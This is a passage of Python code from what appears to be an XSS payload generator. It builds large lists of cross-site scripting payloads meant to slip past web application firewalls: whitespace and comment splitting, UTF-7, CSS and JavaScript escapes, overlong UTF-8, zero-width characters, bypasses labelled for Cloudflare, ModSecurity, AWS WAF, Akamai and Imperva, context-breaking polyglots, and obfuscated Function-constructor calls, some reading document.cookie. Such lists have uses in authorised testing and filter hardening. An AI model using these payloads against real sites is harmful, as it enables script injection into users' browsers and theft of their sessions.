                '\t', '\n', '\r', '\f', '\v',
                '\xa0', '\u2000', '\u2001', '\u2002', '\u2003',
                '\u2004', '\u2005', '\u2006', '\u2007', '\u2008',
                '\u2009', '\u200a', '\u2028', '\u2029', '\u202f',
                '\u205f', '\u3000'
            ]
            
            for ws in whitespace_chars:
                # Replace spaces
                bypass_payloads.append(base.replace(' ', ws))
                
                # Insert before keywords
                if 'script' in base:
                    bypass_payloads.append(base.replace('script', ws + 'script'))
                    bypass_payloads.append(base.replace('script', 'script' + ws))
                
                if 'alert' in base:
                    bypass_payloads.append(base.replace('alert', ws + 'alert'))
                    bypass_payloads.append(base.replace('alert', 'alert' + ws))
                
                # Insert around brackets
                bypass_payloads.append(base.replace('<', ws + '<'))
                bypass_payloads.append(base.replace('>', '>' + ws))
                bypass_payloads.append(base.replace('(', ws + '('))
                bypass_payloads.append(base.replace(')', ')' + ws))
            
            # Multiple whitespace
            bypass_payloads.append(base.replace(' ', '\t\t'))
            bypass_payloads.append(base.replace(' ', '\n\n'))
            bypass_payloads.append(base.replace(' ', '\r\n'))
            bypass_payloads.append(base.replace(' ', '  '))  # Double space
            bypass_payloads.append(base.replace(' ', '   ')) # Triple space
            
            # ============ COMMENT VARIATIONS ============
            comment_patterns = ['/**/', '/* */', '/*!*/', '/*?*/', '/*@*/', '/*#*/']
            
            for comment in comment_patterns:
                # Split keywords
                if 'script' in base:
                    split_index = len('script') // 2
                    split_script = 'script'[:split_index] + comment + 'script'[split_index:]
                    bypass_payloads.append(base.replace('script', split_script))
                
                if 'alert' in base:
                    split_index = len('alert') // 2
                    split_alert = 'alert'[:split_index] + comment + 'alert'[split_index:]
                    bypass_payloads.append(base.replace('alert', split_alert))
                
                if 'onload' in base:
                    split_index = len('onload') // 2
                    split_onload = 'onload'[:split_index] + comment + 'onload'[split_index:]
                    bypass_payloads.append(base.replace('onload', split_onload))
                
                # Insert comments randomly
                if len(base) > 10:
                    midpoint = len(base) // 2
                    bypass_payloads.append(base[:midpoint] + comment + base[midpoint:])
            
            # HTML comments
            html_comments = ['<!-- -->', '<!---->', '<!--!>', '<!--?-->']
            for comment in html_comments:
                bypass_payloads.append(comment + base)
                bypass_payloads.append(base + comment)
                bypass_payloads.append(base.replace(' ', ' ' + comment + ' '))
            
            # ============ UTF-7 ENCODING ============
            utf7_payloads = [
                '+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-',
                '+ADw-img+AD4-+ADw-/img+AD4-',
                '+ADw-svg+AD4-+ADw-/svg+AD4-',
                '+ADw-body+AD4-+ADw-/body+AD4-',
            ]
            bypass_payloads.extend(utf7_payloads)
            
            # ============ CSS ESCAPES ============
            css_escapes = [
                r'\3c script\3e alert(document.domain)\3c \2f script\3e',
                r'\3c img\3e \3c \2f img\3e',
                r'\3c svg\3e \3c \2f svg\3e',
                r'\3c body\3e \3c \2f body\3e',
            ]
            bypass_payloads.extend(css_escapes)
            
            # ============ JAVASCRIPT ESCAPES ============
            js_escapes = [
                r'\x3cscript\x3ealert(document.domain)\x3c\x2fscript\x3e',
                r'\x3cimg\x3e\x3c\x2fimg\x3e',
                r'\x3csvg\x3e\x3c\x2fsvg\x3e',
                r'\u003cscript\u003ealert(document.domain)\u003c\u002fscript\u003e',
                r'\u003cimg\u003e\u003c\u002fimg\u003e',
                r'\u003csvg\u003e\u003c\u002fsvg\u003e',
                r'\74script\76alert(document.domain)\74/script\76',
                r'\74img\76\74/img\76',
                r'\74svg\76\74/svg\76',
            ]
            bypass_payloads.extend(js_escapes)
            
            # ============ MIXED ENCODING ============
            mixed = base.replace('<', '&lt;').replace('>', '&gt;')
            mixed = mixed.replace('script', 'scr\x69pt')
            bypass_payloads.append(mixed)
            
            mixed2 = base.replace('script', 'scr&#105;pt')
            mixed2 = mixed2.replace('alert', 'al&#101;rt')
            bypass_payloads.append(mixed2)
            
            mixed3 = base.replace('<', '\x3c')
            mixed3 = mixed3.replace('>', '\x3e')
            mixed3 = mixed3.replace('script', 'scr' + '\x69' + 'pt')
            bypass_payloads.append(mixed3)
            
            # ============ CASE INSENSITIVE ATTRIBUTES ============
            if 'onload' in base.lower():
                bypass_payloads.append(base.replace('onload', 'ONLOAD'))
                bypass_payloads.append(base.replace('onload', 'OnLoad'))
                bypass_payloads.append(base.replace('onload', 'onLoad'))
                bypass_payloads.append(base.replace('onload', 'Onload'))
            
            if 'onerror' in base.lower():
                bypass_payloads.append(base.replace('onerror', 'ONERROR'))
                bypass_payloads.append(base.replace('onerror', 'OnError'))
                bypass_payloads.append(base.replace('onerror', 'onError'))
                bypass_payloads.append(base.replace('onerror', 'Onerror'))
            
            # ============ QUOTE VARIATIONS ============
            if '"' in base:
                bypass_payloads.append(base.replace('"', "'"))
                bypass_payloads.append(base.replace('"', '`'))
                bypass_payloads.append(base.replace('"', ''))
                bypass_payloads.append(base.replace('"', '&quot;'))
                bypass_payloads.append(base.replace('"', '%22'))
            
            if "'" in base:
                bypass_payloads.append(base.replace("'", '"'))
                bypass_payloads.append(base.replace("'", '`'))
                bypass_payloads.append(base.replace("'", ''))
                bypass_payloads.append(base.replace("'", '&#39;'))
                bypass_payloads.append(base.replace("'", '%27'))
            
            # ============ BRACKET VARIATIONS ============
            bracket_variants = {
                '<': ['&lt;', '%3C', '\x3c', '\u003c', '＜', '&LT;', '&#60;', '&#x3c;'],
                '>': ['&gt;', '%3E', '\x3e', '\u003e', '＞', '&GT;', '&#62;', '&#x3e;'],
                '(': ['&#40;', '%28', '\x28', '\u0028'],
                ')': ['&#41;', '%29', '\x29', '\u0029']
            }
            
            for char, variants in bracket_variants.items():
                if char in base:
                    for variant in variants:
                        bypass_payloads.append(base.replace(char, variant))
            
            # ============ EQUAL SIGN VARIATIONS ============
            if '=' in base:
                equal_variants = ['=>', ' =', '= ', ' = ', '=&gt;', '%3D', '\x3d', '\u003d']
                for variant in equal_variants:
                    bypass_payloads.append(base.replace('=', variant))
            
            # ============ SEMICOLON VARIATIONS ============
            if ';' in base:
                bypass_payloads.append(base.replace(';', ''))
                bypass_payloads.append(base.replace(';', ' ;'))
                bypass_payloads.append(base.replace(';', '; '))
                bypass_payloads.append(base.replace(';', '%3B'))
                bypass_payloads.append(base.replace(';', '\x3b'))
            
            # ============ SLASH VARIATIONS ============
            if '/' in base:
                bypass_payloads.append(base.replace('/', '\\/'))
                bypass_payloads.append(base.replace('/', ' /'))
                bypass_payloads.append(base.replace('/', '/ '))
                bypass_payloads.append(base.replace('/', '%2F'))
                bypass_payloads.append(base.replace('/', '\x2f'))
            
            # ============ BACKSLASH ESCAPING ============
            backslash_payload = base.replace('"', '\\"').replace("'", "\\'")
            bypass_payloads.append(backslash_payload)
            
            # ============ OVERLONG UTF-8 ============
            overlong_variants = [
                base.replace('<', '\xC0\xBC'),
                base.replace('>', '\xC0\xBE'),
                base.replace('<', '\xE0\x80\xBC'),
                base.replace('>', '\xE0\x80\xBE'),
                base.replace('<', '\xF0\x80\x80\xBC'),
                base.replace('>', '\xF0\x80\x80\xBE'),
            ]
            bypass_payloads.extend(overlong_variants)
            
            # ============ ZERO WIDTH CHARACTERS ============
            zero_width_chars = ['\u200b', '\u200c', '\u200d', '\ufeff']
            for zwc in zero_width_chars:
                if len(base) > 5:
                    # Insert at various positions
                    positions = [2, len(base)//2, len(base)-2]
                    for pos in positions:
                        if pos < len(base):
                            bypass_payloads.append(base[:pos] + zwc + base[pos:])
            
            # ============ LINE BREAK INJECTION ============
            line_break_payloads = [
                base.replace(' ', '\r\n'),
                base.replace(' ', '\n\r'),
                base.replace('<', '\r\n<'),
                base.replace('>', '>\r\n'),
                base.replace('(', '\r\n('),
                base.replace(')', ')\r\n'),
            ]
            bypass_payloads.extend(line_break_payloads)
            
            # ============ MULTIBYTE CHARACTERS ============
            multibyte_payloads = [
                base.replace('a', 'á'),
                base.replace('e', 'é'),
                base.replace('i', 'í'),
                base.replace('o', 'ó'),
                base.replace('u', 'ú'),
                base.replace('a', 'à'),
                base.replace('e', 'è'),
                base.replace('i', 'ì'),
                base.replace('o', 'ò'),
                base.replace('u', 'ù'),
            ]
            bypass_payloads.extend(multibyte_payloads)
            
            # ============ HEXADECIMAL ESCAPES ============
            hex_payload = ''.join(f'\\x{ord(c):02x}' for c in base)
            bypass_payloads.append(hex_payload)
            
            # ============ OCTAL ESCAPES ============
            octal_payload = ''.join(f'\\{ord(c):03o}' for c in base)
            bypass_payloads.append(octal_payload)
            
            # ============ UNICODE CODE POINT ESCAPES ============
            unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in base)
            bypass_payloads.append(unicode_payload)
            
            # ============ JAVASCRIPT STRING ESCAPES ============
            if '"' in base or "'" in base:
                escaped = base.replace('"', '\\"').replace("'", "\\'")
                bypass_payloads.append(escaped)
            
            # ============ NESTED TAGS ============
            if '<script>' in base:
                bypass_payloads.append('<script><script>alert(document.domain)</script></script>')
                bypass_payloads.append('<script type="text/javascript">alert(document.domain)</script>')
                bypass_payloads.append('<script language="javascript">alert(document.domain)</script>')
            
            # ============ SELF-CLOSING TAGS ============
            if '<img' in base:
                bypass_payloads.append(base.replace('>', '/>'))
                bypass_payloads.append(base.replace('>', ' />'))
            
            if '<svg' in base:
                bypass_payloads.append(base.replace('>', '/>'))
                bypass_payloads.append(base.replace('>', ' />'))
            
            # ============ MALFORMED ATTRIBUTES ============
            if 'onload' in base or 'onerror' in base:
                malformed = base.replace('=', ' =').replace('=', '= ')
                bypass_payloads.append(malformed)
                
                malformed2 = base.replace('=', ' = ').replace('"', ' "').replace('"', '" ')
                bypass_payloads.append(malformed2)
            
            # ============ EXTRA ATTRIBUTES ============
            if '<script' in base:
                bypass_payloads.append(base.replace('<script', '<script data-test="x"'))
                bypass_payloads.append(base.replace('<script', '<script class="test"'))
                bypass_payloads.append(base.replace('<script', '<script style="display:none"'))
            
            if '<img' in base:
                bypass_payloads.append(base.replace('<img', '<img data-test="x"'))
                bypass_payloads.append(base.replace('<img', '<img class="test"'))
                bypass_payloads.append(base.replace('<img', '<img style="display:none"'))
            
            # ============ PROTOCOL BYPASS ============
            if 'javascript:' in base:
                protocol_variants = [
                    'JAVASCRIPT:',
                    'JavaScript:',
                    'javaScript:',
                    'jav&#x61;script:',
                    'jav&#x09;ascript:',
                    'jav&#x0a;ascript:',
                    'jav&#x0d;ascript:',
                    'jav\x61script:',
                    'jav\x09ascript:',
                    'jav\x0aascript:',
                    'jav\x0dascript:',
                    'java\x00script:',
                    'java\x01script:',
                ]
                for variant in protocol_variants:
                    bypass_payloads.append(base.replace('javascript:', variant))
        
        # ============ ADDITIONAL WAF-SPECIFIC BYPASSES ============
        additional_bypasses = [
            # Cloudflare bypasses
            '<scri%00pt>alert(document.domain)</scri%00pt>',
            '<scri%0apt>alert(document.domain)</scri%0apt>',
            '<scri%0dpt>alert(document.domain)</scri%0dpt>',
            '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
            
            # ModSecurity bypasses
            '<<script>script>alert(document.domain)</script>',
            '<scr<script>ipt>alert(document.domain)</scr<ipt>',
            '1union%0aselect',
            
            # AWS WAF bypasses
            '<script>%0aalert(document.domain)%0a</script>',
            '<script>%0dalert(document.domain)%0d</script>',
            '<script>%09alert(document.domain)%09</script>',
            
            # Akamai bypasses
            '<script>//\nalert(document.domain)//\n</script>',
            '<script>/*\n*/alert(document.domain)/*\n*/</script>',
            
            # Imperva bypasses
            '<script type="text/javascript">/*<![CDATA[*/alert(document.domain)/*]]>*/</script>',
            '<script>/**/alert(document.domain)/**/</script>',
            
            # Generic WAF bypasses
            '<script>window["al"+"ert"](document.domain)</script>',
            '<script>eval("al"+"ert(document.domain)")</script>',
            '<script>Function("ale"+"rt")(document.domain)</script>',
            '<script>setTimeout`alert\\${document.domain}`</script>',
            
            # No bracket bypasses
            '<script>alert`${document.domain}`</script>',
            '<img src=x onerror=alert`${document.domain}`>',
            '<svg onload=alert`${document.domain}`>',
            
            # Template injection
            '${alert(document.domain)}',
            '#{alert(document.domain)}',
            '{{alert(document.domain)}}',
            '<%= alert(document.domain) %>',
            
            # DOM-based bypasses
            '#<script>alert(document.domain)</script>',
            '?x=<script>alert(document.domain)</script>',
            '&x=<script>alert(document.domain)</script>',
            
            # CSS-based bypasses
            '<div style="background:url(javascript:alert(document.domain))">',
            '<div style="background-image:url(javascript:alert(document.domain))">',
            '<div style="list-style:url(javascript:alert(document.domain))">',
            
            # Iframe bypasses
            '<iframe src="javasc&NewLine;ript:alert(document.domain)"></iframe>',
            '<iframe src="javasc&Tab;ript:alert(document.domain)"></iframe>',
            '<iframe src="javasc&#x09;ript:alert(document.domain)"></iframe>',
            
            # Event handler bypasses
            '<div onclick="alert&#40;document.domain&#41;">click</div>',
            '<div onmouseover="alert&#x28;document.domain&#x29;">hover</div>',
            '<div onfocus="alert&NewLine;(document.domain)">focus</div>',
            
            # Data URL bypasses
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></object>',
            '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+">',
            
            # SVG advanced bypasses
            '<svg><script xlink:href="data:text/javascript,alert(document.domain)"></script></svg>',
            '<svg><animate xlink:href="#xss" attributeName="href" values="javascript:alert(document.domain)"/></svg>',
            
            # MathML bypasses
            '<math><mi xlink:href="javascript:alert(document.domain)">test</mi></math>',
            '<math><mo xlink:href="data:text/html,<script>alert(document.domain)</script>">test</mo></math>',
        ]
        
        bypass_payloads.extend(additional_bypasses)
        
        # Remove duplicates and return
        return list(set(bypass_payloads))  # Remove duplicates
    
    def generate_polyglot_payloads(self):
        """Generate enhanced polyglot XSS payloads"""
        polyglots = [
            # ============ BASIC HTML/JAVASCRIPT POLYGLOTS ============
            '"><<sCriPt>alert(document.domain)</sCriPt>',
            '\'<<sCriPt>alert(document.domain)</sCriPt>',
            '`<<sCriPt>alert(document.domain)</sCriPt>',
            '"><img src=x onerror=alert(document.domain)>',
            '\'><img src=x onerror=alert(document.domain)>',
            '`><img src=x onerror=alert(document.domain)>',
            '"><svg onload=alert(document.domain)>',
            '\'><svg onload=alert(document.domain)>',
            '`><svg onload=alert(document.domain)>',
            
            # ============ UNIVERSAL POLYGLOTS (work in multiple contexts) ============
            '\'"></textarea></noscript></title></style></template></noembed></script><svg/onload=alert(document.domain)>',
            '"></textarea></noscript></title></style></template></noembed></script><svg/onload=alert(document.domain)>',
            '`></textarea></noscript></title></style></template></noembed></script><svg/onload=alert(document.domain)>',
            
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=alert(document.domain)//',
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=alert(document.domain)//',
            
            # ============ HTML COMMENT POLYGLOTS ============
            '--><script>alert(document.domain)</script><!--',
            '--><svg onload=alert(document.domain)><!--',
            '--><img src=x onerror=alert(document.domain)><!--',
            '--!><script>alert(document.domain)</script><!--',
            '-->"><script>alert(document.domain)</script><!--',
            
            # ============ ATTRIBUTE POLYGLOTS ============
            '" autofocus onfocus=alert(document.domain) x="',
            '\' autofocus onfocus=alert(document.domain) x=\'',
            '` autofocus onfocus=alert(document.domain) x=`',
            '" onmouseover=alert(document.domain) "',
            '\' onmouseover=alert(document.domain) \'',
            '` onmouseover=alert(document.domain) `',
            
            # ============ SCRIPT TAG POLYGLOTS ============
            '</script><script>alert(document.domain)</script>',
            '</script><svg onload=alert(document.domain)>',
            '</script><img src=x onerror=alert(document.domain)>',
            '</script></style><script>alert(document.domain)</script>',
            '</style></script><script>alert(document.domain)</script>',
            
            # ============ STYLE TAG POLYGLOTS ============
            '</style><script>alert(document.domain)</script>',
            '</style><svg onload=alert(document.domain)>',
            '</style><img src=x onerror=alert(document.domain)>',
            '</style><iframe src=javascript:alert(document.domain)>',
            
            # ============ TEXTAREA POLYGLOTS ============
            '</textarea><script>alert(document.domain)</script>',
            '</textarea><svg onload=alert(document.domain)>',
            '</textarea><img src=x onerror=alert(document.domain)>',
            '</textarea><iframe src=javascript:alert(document.domain)>',
            
            # ============ TITLE POLYGLOTS ============
            '</title><script>alert(document.domain)</script>',
            '</title><svg onload=alert(document.domain)>',
            '</title><img src=x onerror=alert(document.domain)>',
            '</title><iframe src=javascript:alert(document.domain)>',
            
            # ============ NOSCRIPT POLYGLOTS ============
            '</noscript><script>alert(document.domain)</script>',
            '</noscript><svg onload=alert(document.domain)>',
            '</noscript><img src=x onerror=alert(document.domain)>',
            
            # ============ TEMPLATE POLYGLOTS ============
            '</template><script>alert(document.domain)</script>',
            '</template><svg onload=alert(document.domain)>',
            '</template><img src=x onerror=alert(document.domain)>',
            '<template><script>alert(document.domain)</script></template>',
            '<template onload="alert(document.domain)"></template>',
            
            # ============ NOEMBED POLYGLOTS ============
            '</noembed><script>alert(document.domain)</script>',
            '</noembed><svg onload=alert(document.domain)>',
            '</noembed><img src=x onerror=alert(document.domain)>',
            
            # ============ SVG POLYGLOTS ============
            '<svg><script>alert(document.domain)</script></svg>',
            '<svg><g onload="alert(document.domain)"></g></svg>',
            '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(document.domain)"><rect width="1000" height="1000" fill="white"/></a></svg>',
            '<svg/onload=alert(document.domain)>',
            '<svg><style>@import "javascript:alert(document.domain)"</style></svg>',
            '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script></body></foreignObject></svg>',
            '<svg><image xlink:href="javascript:alert(document.domain)"/></svg>',
            '<svg><animate xlink:href="#xss" attributeName="href" values="javascript:alert(document.domain)"/></svg>',
            
            # ============ MATHML POLYGLOTS ============
            '<math><mi//xlink:href="data:x,<script>alert(document.domain)</script>">test',
            '<math><mo xlink:href="javascript:alert(document.domain)">test</mo></math>',
            '<math><annotation-xml encoding="text/html"><script>alert(document.domain)</script></annotation-xml></math>',
            
            # ============ IFRAME POLYGLOTS ============
            '<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>',
            '<iframe src="javascript:alert(document.domain)"></iframe>',
            '<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>',
            '<iframe sandbox="allow-scripts" src="data:text/html,<script>alert(document.domain)</script>"></iframe>',
            
            # ============ OBJECT/EMBED POLYGLOTS ============
            '<object data="data:text/html,<script>alert(document.domain)</script>"></object>',
            '<object data="javascript:alert(document.domain)"></object>',
            '<embed src="data:text/html,<script>alert(document.domain)</script>">',
            '<embed src="javascript:alert(document.domain)">',
            '<applet code="javascript:alert(document.domain)"></applet>',
            
            # ============ BASE TAG POLYGLOTS ============
            '<base href="javascript:alert(document.domain)//">',
            '<base href="data:text/html,<script>alert(document.domain)</script>">',
            
            # ============ FORM POLYGLOTS ============
            '<form action="javascript:alert(document.domain)"><input type=submit>',
            '<form><button formaction="javascript:alert(document.domain)">Click</button></form>',
            '<form id=f></form><button form=f formaction="javascript:alert(document.domain)">Submit</button>',
            
            # ============ META TAG POLYGLOTS ============
            '<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">',
            '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(document.domain)</script>">',
            
            # ============ LINK TAG POLYGLOTS ============
            '<link rel=import href="data:text/html,<script>alert(document.domain)</script>">',
            '<link rel=stylesheet href="javascript:alert(document.domain)">',
            '<link rel=stylesheet href="data:text/css,.x{background-image:url(javascript:alert(document.domain))}">',
            
            # ============ STYLE POLYGLOTS ============
            '<style>@import "javascript:alert(document.domain)";</style>',
            '<style>body{background-image:url("javascript:alert(document.domain)")}</style>',
            '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(document.domain)"></div>',
            '</style><style>@import "javascript:alert(document.domain)";</style>',
            
            # ============ CSS EXPRESSION POLYGLOTS (IE) ============
            '<div style="xss:expression(alert(document.domain))">',
            '<div style="width:expression(alert(document.domain))">',
            
            # ============ JAVASCRIPT PROTOCOL POLYGLOTS ============
            'javascript:alert(document.domain)',
            'jav&#x61;script:alert(document.domain)',
            'jav&#x09;ascript:alert(document.domain)',
            'jav&#x0a;ascript:alert(document.domain)',
            'jav&#x0d;ascript:alert(document.domain)',
            'jav&#x00;ascript:alert(document.domain)',
            
            # ============ DATA URL POLYGLOTS ============
            'data:text/html,<script>alert(document.domain)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
            'data:text/html,<svg onload=alert(document.domain)>',
            'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikiPjwvc3ZnPg==',
            
            # ============ VBSCRIPT POLYGLOTS (IE) ============
            'vbscript:alert(document.domain)',
            'vb&#x73;cript:alert(document.domain)',
            
            # ============ MULTI-LINGUAL POLYGLOTS ============
            # Works in HTML, JavaScript, and URL contexts
            '" onfocus=alert(document.domain) autofocus="',
            '\' onfocus=alert(document.domain) autofocus=\'',
            '` onfocus=alert(document.domain) autofocus=`',
            
            # ============ ENCODING POLYGLOTS ============
            '&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;',
            '%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            '\x22\x3e\x3cscript\x3ealert(document.domain)\x3c/script\x3e',
            '\u0022\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e',
            
            # ============ NULL BYTE POLYGLOTS ============
            '\x00"><script>alert(document.domain)</script>',
            '"\x00><script>alert(document.domain)</script>',
            '\x00javascript:alert(document.domain)',
            
            # ============ UTF-7 POLYGLOTS ============
            '+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-',
            '+ADw-img+AD4-+ADw-/img+AD4-',
            
            # ============ UTF-16 POLYGLOTS ============
            '\xfe\xff\x00<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x00d\x00o\x00c\x00u\x00m\x00e\x00n\x00t\x00.\x00d\x00o\x00m\x00a\x00i\x00n\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>',
            
            # ============ CSS ESCAPE POLYGLOTS ============
            r'\3c script\3e alert(document.domain)\3c /script\3e',
            r'\3c svg onload=alert(document.domain)\3e',
            
            # ============ JAVASCRIPT ESCAPE POLYGLOTS ============
            r'\x3cscript\x3ealert(document.domain)\x3c\x2fscript\x3e',
            r'\u003cscript\u003ealert(document.domain)\u003c\u002fscript\u003e',
            r'\74script\76alert(document.domain)\74/script\76',
            
            # ============ HTML ENTITY POLYGLOTS ============
            '&lt;script&gt;alert(document.domain)&lt;/script&gt;',
            '&#60;script&#62;alert(document.domain)&#60;/script&#62;',
            '&#x3c;script&#x3e;alert(document.domain)&#x3c;/script&#x3e;',
            
            # ============ MIXED CASE POLYGLOTS ============
            '<ScRiPt>alert(document.domain)</ScRiPt>',
            '<sCrIpT>alert(document.domain)</ScRiPt>',
            '<SCRIPT>alert(document.domain)</SCRIPT>',
            '<ScRiPt>alert(doCuMenT.doMaIn)</ScRiPt>',
            
            # ============ COMMENT POLYGLOTS ============
            '/*<!--*/alert(document.domain)//-->',
            '<!--/*--><script>alert(document.domain)</script><!--*/-->',
            '<!--><script>alert(document.domain)</script>',
            
            # ============ BACKTICK POLYGLOTS ============
            '`${alert(document.domain)}`',
            '`${`${alert(document.domain)}`}`',
            '`;alert(document.domain);//',
            
            # ============ DOLLAR SIGN POLYGLOTS ============
            '${alert(document.domain)}',
            '${`${alert(document.domain)}`}',
            '${[alert(document.domain)]}',
            
            # ============ REGEX POLYGLOTS ============
            '/<script>alert(document.domain)</script>/',
            '/alert(document.domain)/',
            
            # ============ CONSOLE POLYGLOTS ============
            '<script>console.log(document.domain)</script>',
            '<script>console.error(document.domain)</script>',
            '<script>console.warn(document.domain)</script>',
            
            # ============ DOCUMENT WRITE POLYGLOTS ============
            '<script>document.write("<script>alert(document.domain)</script>")</script>',
            '<script>document.writeln("<script>alert(document.domain)</script>")</script>',
            
            # ============ INNERHTML POLYGLOTS ============
            '<script>document.body.innerHTML="<img src=x onerror=alert(document.domain)>"</script>',
            '<script>document.write("<div>"+document.domain+"</div>")</script>',
            
            # ============ EVENT HANDLER POLYGLOTS ============
            '<div onclick="alert(document.domain)">Click</div>',
            '<div onmouseover="alert(document.domain)">Hover</div>',
            '<div onload="alert(document.domain)"></div>',
            
            # ============ SELF-CLOSING TAG POLYGLOTS ============
            '<img src=x onerror=alert(document.domain)/>',
            '<svg onload=alert(document.domain)/>',
            '<input value="" onfocus=alert(document.domain) autofocus/>',
            
            # ============ MALFORMED TAG POLYGLOTS ============
            '<script>alert(document.domain)</script x>',
            '<script>alert(document.domain)</script random=attribute>',
            '<script>alert(document.domain)<',
            '<script>alert(document.domain)</script',
            
            # ============ NESTED POLYGLOTS ============
            '<script>/*<!--*/alert(document.domain)//--></script>',
            '<!--<script>alert(document.domain)</script>-->',
            '<div style="/*"><script>alert(document.domain)</script>*/">',
            
            # ============ UNICODE POLYGLOTS ============
            '<ｓｃｒｉｐｔ>alert(document.domain)</ｓｃｒｉｐｔ>',  # Fullwidth
            '<ѕсгірт>alert(document.domain)</ѕсгірт>',  # Cyrillic homoglyphs
            '＜script＞alert(document.domain)＜/script＞',  # Angle brackets
            '«script»alert(document.domain)«/script»',  # Guillemets
            
            # ============ ZERO WIDTH POLYGLOTS ============
            '<\u200Bscript\u200B>alert(document.domain)<\u200B/script\u200B>',
            '<\u200Cscript\u200C>alert(document.domain)<\u200C/script\u200C>',
            '<\u200Dscript\u200D>alert(document.domain)<\u200D/script\u200D>',
            '<\uFEFFscript\uFEFF>alert(document.domain)<\uFEFF/script\uFEFF>',
            
            # ============ MIXED QUOTE POLYGLOTS ============
            '"\'`><script>alert(document.domain)</script>',
            '\'"`><img src=x onerror=alert(document.domain)>',
            '`\'"><svg onload=alert(document.domain)>',
            
            # ============ MULTI-LINE POLYGLOTS ============
            '">\n<script>\nalert(document.domain)\n</script>',
            '\'>\n<svg\nonload=alert(document.domain)\n>',
            '`>\n<img\nsrc=x\nerror=alert(document.domain)\n>',
            
            # ============ TAB/NEWLINE POLYGLOTS ============
            '">\t<script>\talert(document.domain)\t</script>',
            '\'>\r\n<svg\r\nonload=alert(document.domain)\r\n>',
            '`>\n\t<img\n\tsrc=x\n\tonerror=alert(document.domain)\n\t>',
            
            # ============ ADVANCED POLYGLOT (works everywhere) ============
            '">\'`><script src=data:,alert(document.domain)></script>',
            '\'`"><svg/onload=alert(document.domain)>',
            'javascript:"/*\'/*`/*\"></title></textarea></style></noscript></noembed></template></script><svg/onload=alert(document.domain)//',
            
            # ============ POLYGLOT WITH ALL CLOSING TAGS ============
            '\'"></textarea></noscript></title></style></template></noembed></script><svg/onload=alert(document.domain)>',
            '"></textarea></noscript></title></style></template></noembed></script><svg/onload=alert(document.domain)>',
            '`></textarea></noscript></title></style></template></noembed></script><svg/onload=alert(document.domain)>',
            
            # ============ FINAL ULTIMATE POLYGLOT ============
            'javascript:"/*\'/*`/*\"></title></textarea></style></noscript></noembed></template></script><html " onmouseover="/*<svg/*/onload=alert(document.domain)//">'
        ]
        
        return polyglots
    
    def generate_advanced_bypass_payloads(self):
        """Generate enhanced advanced bypass payloads"""
        advanced = []
        
        # ============ TEMPLATE LITERALS & STRING MANIPULATION ============
        # Template literal variations
        advanced.append('<script>alert`${document.domain}`</script>')
        advanced.append('<script>alert`${window.location}`</script>')
        advanced.append('<script>alert`${document.cookie}`</script>')
        advanced.append('<script>alert`${navigator.userAgent}`</script>')
        advanced.append('<img src=x onerror=alert`${document.domain}`>')
        advanced.append('<svg onload=alert`${document.domain}`>')
        advanced.append('<body onload=alert`${document.domain}`>')
        
        # String concatenation variations
        advanced.append('<script>alert("doc"+"ument."+"domain")</script>')
        advanced.append('<script>alert("doc"+"ument."+"cookie")</script>')
        advanced.append('<script>alert(window["doc"+"ument"]["dom"+"ain"])</script>')
        advanced.append('<script>alert(document["dom"+"ain"])</script>')
        advanced.append('<script>alert(document["coo"+"kie"])</script>')
        advanced.append('<script>alert(document["URL"])</script>')
        
        # Array join techniques
        advanced.append('<script>alert(["doc","ument",".", "dom","ain"].join(""))</script>')
        advanced.append('<script>alert(["doc","ument",".","coo","kie"].join(""))</script>')
        
        # ============ INDIRECT EVAL & REFLECTION ============
        # Window object reflection
        advanced.append('<script>window["alert"](document.domain)</script>')
        advanced.append('<script>top["alert"](document.domain)</script>')
        advanced.append('<script>self["alert"](document.domain)</script>')
        advanced.append('<script>parent["alert"](document.domain)</script>')
        advanced.append('<script>frames["alert"](document.domain)</script>')
        advanced.append('<script>globalThis["alert"](document.domain)</script>')
        advanced.append('<script>this["alert"](document.domain)</script>')
        
        # Via prototype chain
        advanced.append('<script>Object.getPrototypeOf(window)["alert"](document.domain)</script>')
        advanced.append('<script>window.constructor.constructor("alert(document.domain)")()</script>')
        
        # Using with statement (deprecated but works in some browsers)
        advanced.append('<script>with(window)alert(document.domain)</script>')
        advanced.append('<script>with(document)alert(domain)</script>')
        
        # ============ FUNCTION CONSTRUCTOR VARIATIONS ============
        advanced.append('<script>Function("ale"+"rt(document.domain)")()</script>')
        advanced.append('<script>new Function("ale"+"rt(document.domain)")()</script>')
        advanced.append('<script>Function.call(null,"alert(document.domain)")</script>')
        advanced.append('<script>Function.apply(null,["alert(document.domain)"])</script>')
        advanced.append('<script>(function(){}.constructor("alert(document.domain)"))()</script>')
        advanced.append('<script>[].constructor.constructor("alert(document.domain)")()</script>')
        advanced.append('<script>{}.constructor.constructor("alert(document.domain)")()</script>')
        advanced.append('<script>true.constructor.constructor("alert(document.domain)")()</script>')
        advanced.append('<script>false.constructor.constructor("alert(document.domain)")()</script>')
